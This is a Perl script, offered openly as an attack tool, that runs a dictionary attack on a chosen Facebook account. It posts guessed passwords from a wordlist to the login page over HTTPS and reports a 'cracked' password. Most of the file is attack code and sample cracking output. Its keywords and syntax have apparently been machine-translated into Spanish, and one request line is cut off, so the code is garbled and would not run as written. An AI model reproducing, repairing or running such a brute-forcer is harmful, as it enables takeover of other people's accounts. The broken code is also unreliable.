#! / usr / bin / perl
#
# Bruteforce-Facebook
#
# Descripción:
# Imad'Ox Cracker es una herramienta de descifrado de contraseñas escrita en perl para realizar un ataque basado en diccionario en un usuario específico de Facebook a través de HTTPS.
#
# Uso:
# perl Imad'Ox-Bruter.pl lista de palabras de inicio de sesión
# login puede ser la dirección de correo electrónico de un usuario o el nombre de perfil
#
# Requisitos del módulo:
#
# Instale el módulo si falta:
# perl -MCPAN -e 'instalar Net :: SSLeay'
#
# Demostración:
# perl Imad'Ox-Bruter.pl Facebooklogin@facebook.com wordlist.lst
#
# --- Herramienta para descifrar contraseñas de Facebook Imad'Ox-Bruter
# --- Por Imad'Ox Hunter
# --- www.facebook.com/imad.elouajib
#
# [+] Cracking Facebooklogin@facebook.com ...
#
# [-] prueba -> Falló
# [-] test123 -> Fallido
# [-] testtest -> Falló
# [-] testest123 -> Fallido
# [-] qwerty -> Fallido
# [-] azerty -> Fallido
# [-] contraseña -> Falló
# [-] contraseña123 -> Fallido
#
################################################ ######
# [+] ¡AGRIETADO! Su contraseña es P @ $$ W0RD
################################################ ######
#

uso estricto
use Net :: SSLeay :: Handle;

if (! definido ($ ARGV [0] && $ ARGV [1])) {

sistema ('claro');
imprimir "\ n +++ Imad'Ox-Bruter Contraseña de Facebook Bruter \ n";
imprimir "+++ Codificado por Imad'Ox-Hunter \ n";
imprimir "+++ www.fb.com/imad.elouajib\n\n";
imprimir "+++ Uso: perl $ 0 lista de palabras de inicio de sesión \ n \ n";
salida; }

mi $ usuario = $ ARGV [0];
mi $ lista de palabras = $ ARGV [1];

open (LIST, $ lista de palabras) || morir "\ n [-] No hay lista de palabras en $ lista de palabras -_- \ n";

imprimir "\ n +++ Imad'Ox-Bruter Contraseña de Facebook Bruter \ n";
imprimir "+++ Codificado por Imad'Ox-Hunter \ n";
imprimir "+++ www.fb.com/imad.elouajib\n";
print "\ n [+] Ahora crackeando a $ usuario ... \ n \ n";

while (mi $ contraseña = <LIST>) {
chomp ($ contraseña);
$ contraseña = ~ s / ([^^ A-Za-z0-9 \ -_.! ~ * '()]) / sprintf "%%% 0x", ord $ 1 / eg;

my $ a = "POST /login.php HTTP / 1.1";
my $ b = "Anfitrión: www.facebook.com";
my $ c = "Conexión: cerrar";
my $ e = "Cache-Control: max-age = 0";
my $ f = "Aceptar: texto / html, aplicación / xhtml + xml, aplicación / xml; q = 0,9, * / *; q = 0,8";
my $ g = "Origen: https://www.facebook.com";
my $ h = "User-Agent: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.31 (KHTML, como Gecko) Chrome / 26.0.1410.63 Safari / 537.31";
my $ i = "Content-Type: application / x-www-form-urlencoded";
my $ j = "Aceptar codificación: gzip, deflate, sdch";
my $ k = "Aceptar-Idioma: en-US, en; q = 0.8";
my $ l = "Aceptar-juego de caracteres: ISO-8859-1, utf-8; q = 0.7, *; q = 0.3";

my $ cookie = "cookie: datr = 80ZzUfKqDOjwL8pauwqMjHTa";
my $ post = "lsd = AVpD2t1f & display = & enable_profile_selector = & legacy_return = 1 & next = & profile_selector_ids = & trynum = 1 & timezone = 300 & lgnrnd = 031110_Euoh & lgnjs = 1366193470 & email = $ usuario & contraseña de inicio de sesión = $ 0
my $ cl = longitud ($ publicación);
my $ d = "Longitud del contenido: $ cl";


my ($ host, $ puerto) = ("www.facebook.com", 443);

tie (* SSL, "Net :: SSLeay :: Handle", $ host, $ puerto);
  

imprimir SSL "$ a \ n";
imprimir SSL "$ b \ n";
imprimir SSL "$ c \ n";
imprimir SSL "$ d \ n";
imprimir SSL "$ e \ n";
imprimir SSL "$ f \ n";
imprimir SSL "$ g \ n";
imprimir SSL "$ h \ n";
imprimir SSL "$ i \ n";
imprimir SSL "$ j \ n";
imprimir SSL "$ k \ n";
imprimir SSL "$ l \ n";
imprimir SSL "$ cookie \ n \ n";

imprimir SSL "$ publicación \ n";

mi $ éxito;
while (mi $ resultado = <SSL>) {
if ($ resultado = ~ / Ubicación (. *?) /) {
$ éxito = $ 1;
}
}
si (! definido $ éxito)
{
imprimir "[-] $ contraseña -> No él :( \ n";
cerrar SSL;
}
más
{
imprimir "\ n ############################################ ##########\norte";
print "[+] Yuuup !! Pass Cracked => Pass is $ contraseña: D \ n";
impresión "################################################ ######## \ n \ n ";
cerrar SSL;
salida;
}
}
